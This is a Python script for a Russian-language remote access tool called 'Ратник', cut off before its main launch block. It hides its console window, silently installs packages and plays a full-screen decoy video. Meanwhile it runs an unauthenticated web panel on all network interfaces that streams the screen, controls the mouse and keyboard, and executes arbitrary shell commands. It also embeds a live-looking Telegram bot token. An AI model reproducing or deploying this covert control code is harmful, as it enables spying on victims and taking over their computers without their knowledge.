#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import ctypes
import subprocess
import importlib
import time
import threading
import webbrowser
import platform
import tempfile
import socket
import base64
import io
import logging
import json
from datetime import datetime

# ============================================================
# СКРЫВАЕМ КОМАНДНУЮ СТРОКУ
# ============================================================

if platform.system() == 'Windows':
    try:
        ctypes.windll.user32.ShowWindow(
            ctypes.windll.kernel32.GetConsoleWindow(), 0
        )
    except:
        pass

# ============================================================
# АВТОУСТАНОВКА ЗАВИСИМОСТЕЙ
# ============================================================

REQUIRED = ['flask', 'pyautogui', 'pillow', 'opencv-python', 'numpy', 'python-telegram-bot', 'requests']

def install_package(pkg):
    try:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", pkg, "--quiet"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == 'Windows' else 0
        )
        return True
    except:
        return False

def check_and_install():
    missing = []
    for pkg in REQUIRED:
        iname = 'cv2' if pkg == 'opencv-python' else 'PIL' if pkg == 'pillow' else pkg
        try:
            importlib.import_module(iname)
        except:
            missing.append(pkg)
    
    if missing:
        for pkg in missing:
            install_package(pkg)
    
    return True

check_and_install()

# ============================================================
# ИМПОРТЫ
# ============================================================

from flask import Flask, render_template_string, request, jsonify
import pyautogui
import cv2
import numpy as np
from PIL import Image
import requests

app = Flask(__name__)
app.logger.setLevel(logging.ERROR)

# ============================================================
# КОНФИГУРАЦИЯ
# ============================================================

class Config:
    TELEGRAM_TOKEN = "8855186207:AAEXiPDl0eNI2MvB7PGg2wOlfecmTWmdOt8"
    ALLOWED_USERS = [5614047997]
    VERSION = "3.0"
    NAME = "Ратник"
    STREAM_FPS = 30
    PORT = 5001

# ============================================================
# ВИДЕО — просто берём из папки
# ============================================================

# Положи video.mp4 рядом с этим файлом!
VIDEO_PATH = "video.mp4"

# ============================================================
# ФУНКЦИИ
# ============================================================

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def capture_screen(w=400, h=300, q=50):
    try:
        screenshot = pyautogui.screenshot()
        img = screenshot.resize((w, h), Image.Resampling.LANCZOS)
        buf = io.BytesIO()
        img.save(buf, format='JPEG', quality=q, optimize=True)
        return base64.b64encode(buf.getvalue()).decode('utf-8')
    except:
        return None

def play_sound(sound_type):
    try:
        if platform.system() == 'Windows':
            import winsound
            sounds = {
                'beep': (1000, 300),
                'success': (1200, 200),
                'error': (400, 500),
                'notification': (800, 150),
                'alarm': (800, 300),
                'click': (600, 50)
            }
            if sound_type in sounds:
                freq, dur = sounds[sound_type]
                winsound.Beep(freq, dur)
            return f"Звук '{sound_type}'"
        else:
            os.system('printf "\\a"')
            return f"Звук '{sound_type}'"
    except:
        return "Ошибка"

def press_key(key):
    try:
        if '+' in key:
            pyautogui.hotkey(*key.split('+'))
        else:
            pyautogui.press(key)
        return f"Нажал {key}"
    except:
        return "Ошибка"

def open_website(url):
    try:
        webbrowser.open(url)
        return f"Открыт сайт: {url}"
    except:
        return "Ошибка"

# ============================================================
# HTML ИНТЕРФЕЙС РАТНИКА
# ============================================================

RATNIK_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>⚔️ РАТНИК</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a0f;color:#fff;font-family:'Segoe UI',sans-serif;padding:15px;min-height:100vh}
        .container{max-width:500px;margin:0 auto}
        .header{text-align:center;padding:20px;background:linear-gradient(135deg,rgba(255,215,0,0.03),rgba(255,45,85,0.03));border-radius:15px;border:1px solid rgba(255,215,0,0.05);margin-bottom:15px}
        .logo{font-size:36px;font-weight:900;color:#ffd700;text-shadow:0 0 30px rgba(255,215,0,0.2)}
        .subtitle{font-size:11px;color:rgba(255,255,255,0.2);letter-spacing:4px;margin-top:5px}
        .fps-badge{display:inline-block;background:rgba(0,255,136,0.05);border:1px solid rgba(0,255,136,0.1);color:#00ff88;font-size:9px;padding:2px 12px;border-radius:20px;margin-top:5px}
        .secret-badge{text-align:center;font-size:9px;color:rgba(255,215,0,0.1);font-family:monospace;margin-top:10px}
        .status-bar{display:flex;justify-content:space-between;align-items:center;background:rgba(255,255,255,0.02);border:1px solid rgba(255,215,0,0.05);border-radius:10px;padding:8px 14px;margin:10px 0;font-size:11px}
        .status-dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:#00ff88;animation:pulse 1.5s infinite;margin-right:8px}
        @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
        .status-text{color:rgba(255,255,255,0.4)}
        .coords{text-align:center;font-size:10px;color:rgba(255,255,255,0.1);font-family:monospace;margin:5px 0}
        .btn{display:inline-flex;align-items:center;justify-content:center;padding:10px;border:1px solid rgba(255,215,0,0.08);border-radius:10px;background:rgba(255,255,255,0.02);color:rgba(255,255,255,0.7);font-size:12px;font-weight:600;cursor:pointer;transition:0.2s;user-select:none;min-height:38px;width:100%}
        .btn:active{transform:scale(0.95);background:rgba(255,215,0,0.05)}
        .btn-primary{border-color:rgba(255,215,0,0.15);color:#ffd700}
        .btn-danger{border-color:rgba(255,45,85,0.15);color:#ff2d55}
        .btn-success{border-color:rgba(0,255,136,0.15);color:#00ff88}
        .btn-cyan{border-color:rgba(0,212,255,0.15);color:#00d4ff}
        .btn-purple{border-color:rgba(155,89,182,0.15);color:#9b59b6}
        .btn-small{padding:6px 10px;font-size:10px;min-height:28px}
        .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:6px}
        .grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px}
        .grid-4{display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:4px}
        .section{margin:10px 0}
        .section-title{font-size:9px;color:rgba(255,255,255,0.1);text-transform:uppercase;letter-spacing:3px;margin-bottom:6px;display:flex;align-items:center;gap:8px}
        .section-title::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,rgba(255,215,0,0.05),transparent)}
        .touchpad{width:100%;height:150px;background:rgba(255,255,255,0.01);border:1px solid rgba(255,215,0,0.05);border-radius:10px;margin:8px 0;display:flex;align-items:center;justify-content:center;color:rgba(255,255,255,0.05);font-size:12px;user-select:none;transition:all 0.3s}
        .touchpad.active{border-color:rgba(255,215,0,0.1);background:rgba(255,215,0,0.02)}
        .cmd-input{display:flex;gap:6px;margin:8px 0}
        .cmd-input input{flex:1;padding:8px 14px;border-radius:10px;border:1px solid rgba(255,215,0,0.05);background:rgba(255,255,255,0.02);color:rgba(255,255,255,0.5);font-size:12px;outline:none;font-family:monospace}
        .cmd-input input:focus{border-color:rgba(255,215,0,0.1)}
        .cmd-input input::placeholder{color:rgba(255,255,255,0.08)}
        .cmd-input .btn{flex:0 0 auto;width:auto;padding:8px 16px}
        .stream-container{background:#000;border-radius:10px;overflow:hidden;border:1px solid rgba(255,215,0,0.05);margin:10px 0;display:none;position:relative}
        .stream-container.active{display:block}
        .stream-container img{width:100%;height:auto;display:block}
        .stream-overlay{position:absolute;top:8px;left:8px;background:rgba(0,0,0,0.7);padding:4px 12px;border-radius:20px;font-size:9px;color:#ffd700;display:flex;align-items:center;gap:6px}
        .stream-overlay .dot{width:5px;height:5px;background:#ff2d55;border-radius:50%;animation:pulse 0.8s infinite}
        .screenshot-preview{margin:8px 0;border-radius:10px;overflow:hidden;border:1px solid rgba(0,212,255,0.05);display:none}
        .screenshot-preview.active{display:block}
        .screenshot-preview img{width:100%;height:auto;display:block}
        .toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%) translateY(80px);background:rgba(0,0,0,0.92);border:1px solid rgba(255,215,0,0.05);padding:10px 20px;border-radius:10px;font-size:12px;color:rgba(255,255,255,0.6);z-index:100;opacity:0;transition:0.4s;pointer-events:none;max-width:90%;text-align:center}
        .toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
        .toast.success{border-color:rgba(0,255,136,0.1);color:#00ff88}
        .toast.error{border-color:rgba(255,45,85,0.1);color:#ff2d55}
        .telegram-section{margin-top:15px;padding-top:12px;border-top:1px solid rgba(255,215,0,0.03)}
        .telegram-status{font-size:9px;color:rgba(255,255,255,0.1);text-align:center;margin-bottom:6px;font-family:monospace}
        #infoDisplay{margin-top:6px;font-size:10px;color:rgba(255,255,255,0.1);font-family:monospace;display:none;background:rgba(255,255,255,0.01);padding:10px;border-radius:8px;border:1px solid rgba(255,215,0,0.02);line-height:1.8}
        #infoDisplay.show{display:block}
        @media(max-width:480px){.container{padding:10px 8px}.logo{font-size:28px}}
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <div class="logo">⚔️ РАТНИК</div>
        <div class="subtitle">Система управления ПК</div>
        <div class="fps-badge">🎯 30 FPS</div>
        <div class="secret-badge">🕵️ Скрытый режим активен</div>
    </div>
    
    <div class="status-bar">
        <div><span class="status-dot"></span><span class="status-text" id="statusText">Готов к работе</span></div>
        <span style="font-size:9px;color:rgba(255,255,255,0.1)">v3.0</span>
    </div>
    
    <div class="coords" id="coords">🖱 X: 0 Y: 0</div>
    
    <div class="stream-container" id="streamContainer">
        <div class="stream-overlay"><span class="dot"></span> LIVE <span style="color:#00ff88;font-size:8px;">30 FPS</span></div>
        <img id="streamImage" src="" alt="Стрим">
    </div>
    
    <div class="screenshot-preview" id="screenshotPreview">
        <img id="screenshotImage" src="" alt="Скриншот">
    </div>
    
    <div class="section">
        <div class="section-title">📡 СТРИМИНГ</div>
        <div class="grid-2">
            <button class="btn btn-primary" onclick="startStream()">▶ СТРИМ</button>
            <button class="btn btn-danger" onclick="stopStream()">⏹ СТОП</button>
        </div>
        <div class="grid-2" style="margin-top:6px">
            <button class="btn btn-cyan" onclick="takeScreenshot()">📸 СКРИНШОТ</button>
            <button class="btn btn-purple" onclick="getInfo()">ℹ️ ИНФО</button>
        </div>
    </div>
    
    <div class="section">
        <div class="section-title">🖱 МЫШЬ</div>
        <div class="touchpad" id="touchpad">👆 Веди пальцем<br><span style="font-size:9px;color:rgba(255,255,255,0.03)">тап=ЛКМ · два тапа=ПКМ</span></div>
        <div style="max-width:220px;margin:0 auto">
            <div class="grid-3">
                <div></div><button class="btn btn-small" onclick="mouseMove(0,-30)">⬆</button><div></div>
                <button class="btn btn-small" onclick="mouseMove(-30,0)">⬅</button>
                <button class="btn btn-small btn-primary" onclick="mouseClick('left')">ЛКМ</button>
                <button class="btn btn-small" onclick="mouseMove(30,0)">➡</button>
                <div></div><button class="btn btn-small" onclick="mouseMove(0,30)">⬇</button><div></div>
            </div>
            <div class="grid-2" style="margin-top:6px">
                <button class="btn btn-small btn-cyan" onclick="mouseScroll(10)">⬆ СКРОЛЛ</button>
                <button class="btn btn-small btn-cyan" onclick="mouseScroll(-10)">⬇ СКРОЛЛ</button>
            </div>
            <button class="btn btn-small btn-danger" onclick="mouseClick('right')" style="margin-top:4px">🖱 ПКМ</button>
        </div>
    </div>
    
    <div class="section">
        <div class="section-title">🔊 ГРОМКОСТЬ</div>
        <div class="grid-4">
            <button class="btn btn-small btn-success" onclick="setVolume100()">100%</button>
            <button class="btn btn-small" onclick="volumeUp()">+</button>
            <button class="btn btn-small" onclick="volumeDown()">-</button>
            <button class="btn btn-small btn-danger" onclick="volumeMute()">MUTE</button>
        </div>
    </div>
    
    <div class="section">
        <div class="section-title">🔔 ЗВУКИ</div>
        <div class="grid-4">
            <button class="btn btn-small btn-primary" onclick="playSound('beep')">Бип</button>
            <button class="btn btn-small btn-success" onclick="playSound('success')">✅</button>
            <button class="btn btn-small btn-danger" onclick="playSound('error')">❌</button>
            <button class="btn btn-small btn-cyan" onclick="playSound('notification')">🔔</button>
        </div>
        <div class="grid-4" style="margin-top:4px">
            <button class="btn btn-small btn-purple" onclick="playSound('alarm')">🚨</button>
            <button class="btn btn-small" onclick="playSound('click')">👆</button>
        </div>
    </div>
    
    <div class="section">
        <div class="section-title">⌨️ КЛАВИШИ</div>
        <div class="grid-4">
            <button class="btn btn-small" onclick="sendKey('up')">⬆</button>
            <button class="btn btn-small" onclick="sendKey('down')">⬇</button>
            <button class="btn btn-small" onclick="sendKey('left')">⬅</button>
            <button class="btn btn-small" onclick="sendKey('right')">➡</button>
        </div>
        <div class="grid-4" style="margin-top:4px">
            <button class="btn btn-small" onclick="sendKey('space')">␣</button>
            <button class="btn btn-small" onclick="sendKey('enter')">↵</button>
            <button class="btn btn-small btn-cyan" onclick="sendKey('esc')">ESC</button>
            <button class="btn btn-small" onclick="sendKey('win')">⊞</button>
        </div>
        <div class="grid-3" style="margin-top:4px">
            <button class="btn btn-small btn-cyan" onclick="sendKey('alt+tab')">⎇ TAB</button>
            <button class="btn btn-small btn-danger" onclick="sendKey('alt+f4')">⛔ ALT+F4</button>
        </div>
    </div>
    
    <div class="section">
        <div class="section-title">🌐 САЙТЫ</div>
        <div class="grid-3">
            <button class="btn btn-small btn-primary" onclick="openSite('discord')">💬 Discord</button>
            <button class="btn btn-small btn-danger" onclick="openSite('youtube')">▶ YouTube</button>
            <button class="btn btn-small btn-success" onclick="openSite('google')">🔍 Google</button>
        </div>
        <div class="grid-3" style="margin-top:4px">
            <button class="btn btn-small btn-cyan" onclick="openSite('vk')">📱 VK</button>
            <button class="btn btn-small" onclick="openSite('telegram')">✈️ Telegram</button>
        </div>
    </div>
    
    <div class="section">
        <div class="section-title">💻 КОМАНДА</div>
        <div class="cmd-input">
            <input id="cmdInput" placeholder="calc, notepad, chrome..." />
            <button class="btn btn-primary" onclick="sendCmd()">▶</button>
        </div>
    </div>
    
    <div class="telegram-section">
        <div class="telegram-status">🤖 Telegram бот активен · /start</div>
    </div>
    
    <div id="infoDisplay"></div>
</div>

<div class="toast" id="toast"></div>

<script>
    let streamActive = false;
    let streamInterval = null;
    let touchActive = false;
    let touchLastX = 0;
    let touchLastY = 0;
    let touchLastTap = 0;
    let toastTimeout = null;

    function showToast(message, type = '') {
        const toast = document.getElementById('toast');
        toast.textContent = message;
        toast.className = 'toast ' + type;
        void toast.offsetWidth;
        toast.classList.add('show');
        if (toastTimeout) clearTimeout(toastTimeout);
        toastTimeout = setTimeout(() => toast.classList.remove('show'), 2500);
    }

    async function apiCall(url, method = 'GET', body = null) {
        try {
            const options = { method: method, headers: { 'Content-Type': 'application/json' } };
            if (body) options.body = JSON.stringify(body);
            const response = await fetch(url, options);
            return await response.json();
        } catch (e) {
            showToast('❌ Ошибка соединения', 'error');
            return null;
        }
    }

    function startStream() {
        if (streamActive) return;
        streamActive = true;
        document.getElementById('streamContainer').classList.add('active');
        showToast('📡 Стрим запущен (30 FPS)', 'success');
        streamInterval = setInterval(async () => {
            const data = await apiCall('/stream_frame');
            if (data && data.image) {
                document.getElementById('streamImage').src = 'data:image/jpeg;base64,' + data.image;
            }
        }, 33);
    }

    function stopStream() {
        streamActive = false;
        if (streamInterval) { clearInterval(streamInterval); streamInterval = null; }
        document.getElementById('streamContainer').classList.remove('active');
        showToast('⏹ Стрим остановлен', '');
    }

    async function takeScreenshot() {
        showToast('📸 Делаю скриншот...', '');
        const data = await apiCall('/screenshot');
        if (data && data.image) {
            const preview = document.getElementById('screenshotPreview');
            document.getElementById('screenshotImage').src = 'data:image/jpeg;base64,' + data.image;
            preview.classList.add('active');
            setTimeout(() => preview.classList.remove('active'), 8000);
        }
    }

    async function getInfo() {
        const data = await apiCall('/info');
        if (data) {
            const display = document.getElementById('infoDisplay');
            display.innerHTML = `
                🖥 ОС: ${data.os}<br>
                🏠 IP: ${data.local_ip}:5001<br>
                🌍 Публичный IP: ${data.public_ip}<br>
                👤 Ваш ID: ${data.user_id}
            `;
            display.classList.add('show');
            setTimeout(() => display.classList.remove('show'), 10000);
        }
    }

    async function mouseMove(dx, dy) {
        await apiCall('/mouse/move', 'POST', { dx, dy });
    }

    async function mouseClick(btn) {
        const data = await apiCall('/mouse/click', 'POST', { button: btn });
        showToast('🖱 ' + data.message);
    }

    async function mouseScroll(amount) {
        await apiCall('/mouse/scroll', 'POST', { amount: amount });
    }

    async function sendKey(key) {
        const data = await apiCall('/key', 'POST', { key: key });
        showToast('⌨️ ' + data.message);
    }

    async function setVolume100() {
        await apiCall('/volume/100', 'POST');
        showToast('🔊 100%', 'success');
    }

    async function volumeUp() {
        await apiCall('/volume/up', 'POST');
    }

    async function volumeDown() {
        await apiCall('/volume/down', 'POST');
    }

    async function volumeMute() {
        await apiCall('/volume/mute', 'POST');
        showToast('🔇 Mute');
    }

    async function playSound(type) {
        const data = await apiCall('/sound/' + type, 'POST');
        showToast('🔔 ' + data.message);
    }

    async function openSite(site) {
        const data = await apiCall('/open/' + site, 'POST');
        showToast('🌐 ' + data.message);
    }

    async function sendCmd() {
        const cmd = document.getElementById('cmdInput').value;
        if (!cmd) return;
        const data = await apiCall('/cmd', 'POST', { cmd: cmd });
        showToast('💻 ' + data.message);
        document.getElementById('cmdInput').value = '';
    }

    // Координаты мыши
    setInterval(async () => {
        const data = await apiCall('/mouse_pos');
        if (data) {
            document.getElementById('coords').textContent = '🖱 X: ' + data.x + ' Y: ' + data.y;
        }
    }, 1000);

    // Тачпад
    const touchpad = document.getElementById('touchpad');
    let tx = 0, ty = 0, ta = false;
    
    touchpad.addEventListener('touchstart', e => {
        e.preventDefault();
        const touch = e.touches[0];
        ta = true;
        tx = touch.clientX;
        ty = touch.clientY;
        touchpad.classList.add('active');
        
        const now = Date.now();
        if (now - touchLastTap < 300) {
            mouseClick('right');
            touchLastTap = 0;
        } else {
            touchLastTap = now;
        }
    });

    touchpad.addEventListener('touchmove', e => {
        e.preventDefault();
        if (!ta) return;
        const touch = e.touches[0];
        const dx = touch.clientX - tx;
        const dy = touch.clientY - ty;
        tx = touch.clientX;
        ty = touch.clientY;
        if (Math.abs(dx) > 3 || Math.abs(dy) > 3) {
            mouseMove(dx * 0.5, dy * 0.5);
        }
    });

    touchpad.addEventListener('touchend', e => {
        e.preventDefault();
        ta = false;
        touchpad.classList.remove('active');
        mouseClick('left');
    });
</script>
</body>
</html>
'''

# ============================================================
# РОУТЫ РАТНИКА
# ============================================================

@app.route('/')
def index():
    return render_template_string(RATNIK_HTML)

@app.route('/stream_frame')
def stream_frame():
    return {"image": capture_screen(640, 480, 75)}

@app.route('/screenshot')
def screenshot():
    return {"image": capture_screen(800, 600, 85)}

@app.route('/mouse_pos')
def mouse_pos():
    x, y = pyautogui.position()
    return {"x": x, "y": y}

@app.route('/mouse/move', methods=['POST'])
def mouse_move():
    data = request.json
    try:
        pyautogui.moveRel(data.get('dx', 0), data.get('dy', 0))
        return {"x": data.get('dx', 0), "y": data.get('dy', 0)}
    except:
        return {"error": "Ошибка"}

@app.route('/mouse/click', methods=['POST'])
def mouse_click():
    btn = request.json.get('button', 'left')
    pyautogui.click(button=btn)
    return {"message": f"Клик {btn}"}

@app.route('/mouse/scroll', methods=['POST'])
def mouse_scroll():
    pyautogui.scroll(request.json.get('amount', 0))
    return {"message": "Скролл"}

@app.route('/key', methods=['POST'])
def key():
    key = request.json.get('key', '')
    try:
        if '+' in key:
            pyautogui.hotkey(*key.split('+'))
        else:
            pyautogui.press(key)
        return {"message": f"Нажал {key}"}
    except:
        return {"message": "Ошибка"}

@app.route('/volume/100', methods=['POST'])
def vol100():
    for _ in range(50):
        pyautogui.press('volumeup')
        time.sleep(0.01)
    return {"message": "100%"}

@app.route('/volume/up', methods=['POST'])
def volup():
    pyautogui.press('volumeup')
    return {"message": "+"}

@app.route('/volume/down', methods=['POST'])
def voldown():
    pyautogui.press('volumedown')
    return {"message": "-"}

@app.route('/volume/mute', methods=['POST'])
def volmute():
    pyautogui.press('volumemute')
    return {"message": "Mute"}

@app.route('/sound/<sound_type>', methods=['POST'])
def sound(sound_type):
    try:
        if platform.system() == 'Windows':
            import winsound
            sounds = {
                'beep': (1000, 300),
                'success': (1200, 200),
                'error': (400, 500),
                'notification': (800, 150),
                'alarm': (800, 300),
                'click': (600, 50)
            }
            if sound_type in sounds:
                freq, dur = sounds[sound_type]
                winsound.Beep(freq, dur)
            return {"message": f"Звук '{sound_type}'"}
        else:
            os.system('printf "\\a"')
            return {"message": f"Звук '{sound_type}'"}
    except:
        return {"message": "Ошибка"}

@app.route('/open/<site>', methods=['POST'])
def open_site(site):
    sites = {
        'discord': 'https://discord.ru',
        'youtube': 'https://youtube.com',
        'google': 'https://google.com',
        'vk': 'https://vk.com',
        'telegram': 'https://web.telegram.org'
    }
    if site in sites:
        webbrowser.open(sites[site])
        return {"message": f"Открыт: {site}"}
    return {"message": "Не найден"}

@app.route('/cmd', methods=['POST'])
def cmd():
    try:
        subprocess.Popen(request.json.get('cmd', ''), shell=True)
        return {"message": "Выполнено"}
    except:
        return {"message": "Ошибка"}

@app.route('/info')
def info():
    return {
        "os": platform.system(),
        "local_ip": get_local_ip(),
        "public_ip": "Не получен",
        "user_id": Config.ALLOWED_USERS[0]
    }

# ============================================================
# ЗАПУСК ВИДЕО + РАТНИК
# ============================================================

def run_ratnik():
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')
    try:
        app.run(host='0.0.0.0', port=5001, debug=False, threaded=True)
    except:
        pass

def play_video():
    """Проигрывает видео из папки"""
    if os.path.exists(VIDEO_PATH):
        try:
            import cv2
            cap = cv2.VideoCapture(VIDEO_PATH)
            if cap.isOpened():
                cv2.namedWindow('🎬 Video#93701', cv2.WINDOW_NORMAL)
                cv2.setWindowProperty('🎬 Video#93701', cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
                
                while True:
                    ret, frame = cap.read()
                    if not ret:
                        cap.set(cv2.CAP_PROP_POS_FRAMES, 0)
                        continue
                    
                    cv2.putText(frame, '🎬 Video#93701', (50, 50),
                               cv2.FONT_HERSHEY_SIMPLEX, 1, (255, 215, 0), 2)
                    cv2.putText(frame, f'🕵️ Ратник: http://{get_local_ip()}:5001', (50, 100),
                               cv2.FONT_HERSHEY_SIMPLEX, 0.6, (100, 200, 255), 2)
                    cv2.putText(frame, '📱 Управляй с телефона!', (50, 140),
                               cv2.FONT_HERSHEY_SIMPLEX, 0.6, (0, 255, 136), 2)
                    
                    cv2.imshow('🎬 Video#93701', frame)
                    
                    if cv2.waitKey(30) & 0xFF == 27:  # ESC
                        break
                
                cap.release()
                cv2.destroyAllWindows()
            else:
                print("⚠️ Не удалось открыть видео")
        except Exception as e:
            print(f"⚠️ Ошибка видео: {e}")
    else:
        print(f"⚠️ Видео не найдено: {VIDEO_PATH}")

# ============================================================
# ГЛАВНЫЙ ЗАПУСК
# =================================